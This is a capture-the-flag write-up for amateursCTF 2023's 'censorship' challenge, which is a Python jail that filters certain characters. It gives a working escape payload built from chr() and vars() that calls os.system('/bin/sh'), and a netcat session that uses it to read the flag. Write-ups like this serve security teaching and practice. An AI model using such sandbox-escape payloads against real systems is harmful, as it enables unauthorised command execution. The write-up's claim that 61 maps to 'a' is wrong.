# censorship

## problem

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/a205a126-568d-4093-804f-e795ec1bf19e)

```py
#!/usr/local/bin/python
from flag import flag

for _ in [flag]:
    while True:
        try:
            code = ascii(input("Give code: "))
            if "flag" in code or "e" in code or "t" in code or "\\" in code:
                raise ValueError("invalid input")
            exec(eval(code))
        except Exception as err:
            print(err)
```

## solution

to see which functions we have access to, we can use this:

```
>>> [_ for _ in dir(__builtins__) if "e" not in _ and "t" not in _ and "\\" not in _]
['BlockingIOError', 'EOFError', 'Ellipsis', 'EncodingWarning', 'IOError', 'LookupError', 'OSError', 'TabError', 'UnboundLocalError', 'Warning', '__build_class__', '__doc__', 'abs',
'all', 'any', 'ascii', 'bin', 'bool', 'chr', 'dir', 'divmod', 'globals', 'hash', 'id', 'issubclass', 'locals', 'map', 'max', 'min', 'ord', 'pow', 'round', 'sum', 'vars', 'zip']
```

notably, we have access to the `chr` function, which allows us to construct a string from integers (`61 -> "a"`)

to seal the deal, we have `vars`, which allows us access to `__builtins__`

we can use this payload to get access to a shell

```py
vars(vars(vars()[chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)])[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)]('os'))[chr(1
15)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)]('/bin/sh')
```

it does this:
`vars(vars(vars()['__builtins__'])['__import__']('os'))['system']('/bin/sh')`

which is equivalent to this:
`__builtins__.__import__('os').system('/bin/sh')`

and so we get the flag
```
quasar@quasar098:~$ nc amt.rs 31670
Give code: vars(vars(vars()[chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)])[chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)]('os'))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)]('/bin/sh')
$ ls
flag.py
run
$ cat flag.py
flag = "amateursCTF{i_l0v3_overwr1t1nG_functions..:D}"
$ exit
Give code: ^C
```

despite what the flag says, i did not overwrite any functions. not even in my solution for the next challenge, [censorship-lite](https://github.com/quasar098/ctf-writeups/tree/main/amateursctf-2023/censorship-lite)
